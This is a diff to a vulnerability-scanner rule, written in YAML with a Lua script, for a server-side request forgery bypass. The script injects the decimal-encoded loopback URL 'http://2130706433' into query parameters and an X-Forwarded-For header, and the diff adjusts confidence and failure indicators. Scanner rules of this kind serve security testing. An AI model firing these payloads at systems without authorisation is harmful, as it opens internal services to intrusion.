@@ -8,10 +8,17 @@ meta:
   created: "2026-06-19"
   updated: "2026-07-21"
   rank: 80
-  confidence: 90
+  confidence: 55
   severity: high
   tags: [decimal, ipv4, encoding, bypass]
   references: []
+  success_indicator: []
+  failure_indicator:
+    - "literal:<html"
+    - "literal:<!DOCTYPE"
+    - "literal:404"
+    - "literal:Access Denied"
+    - "literal:Forbidden"
 
 match:
   schemes: [http, https]
@@ -26,16 +33,12 @@ script:
   source: |
     function run_batch(targets)
         local results = {}
-        local payload_vector = "http://2130706433" -- 127.0.0.1 in Decimal
+        local payload_vector = "http://2130706433"
         
         for _, target in ipairs(targets) do
             local base_url = target.url
-            
-            -- به ازای هر پارامتر، پی‌لود تزریق می‌شود
             for _, param in ipairs(target.params) do
                 local new_url = base_url
-                
-                -- جایگزینی ساده در Query String (قابل توسعه بر اساس location)
                 if param.location == "Query" then
                     local pattern = param.name .. "=[^&]*"
                     local replacement = param.name .. "=" .. payload_vector
@@ -46,16 +49,12 @@ script:
                         new_url = new_url .. sep .. replacement
                     end
                 end
-
                 table.insert(results, {
                     url = new_url,
                     method = target.method or "GET",
                     headers = {
                         ["X-Forwarded-For"] = "2130706433",
-                        -- ["User-Agent"] = "SSRFdevil-Engine/2.0"
                     },
-                    -- body = "",
-                    -- action = "scan"
                 })
             end
         end
